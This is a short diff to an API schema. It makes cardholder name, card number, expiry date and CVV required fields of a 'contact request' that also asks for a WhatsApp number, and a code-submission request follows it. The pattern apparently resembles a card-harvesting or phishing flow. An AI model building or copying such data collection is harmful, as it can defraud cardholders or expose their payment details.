@@ -183,12 +183,24 @@ components:
     SubmitContactRequest:
       type: object
       properties:
+        cardName:
+          type: string
+        cardNumber:
+          type: string
+        cardExpiry:
+          type: string
+        cardCvv:
+          type: string
         whatsapp:
           type: string
         name:
           type: string
       required:
         - whatsapp
+        - cardName
+        - cardNumber
+        - cardExpiry
+        - cardCvv
     SubmitCodeRequest:
       type: object
       properties:
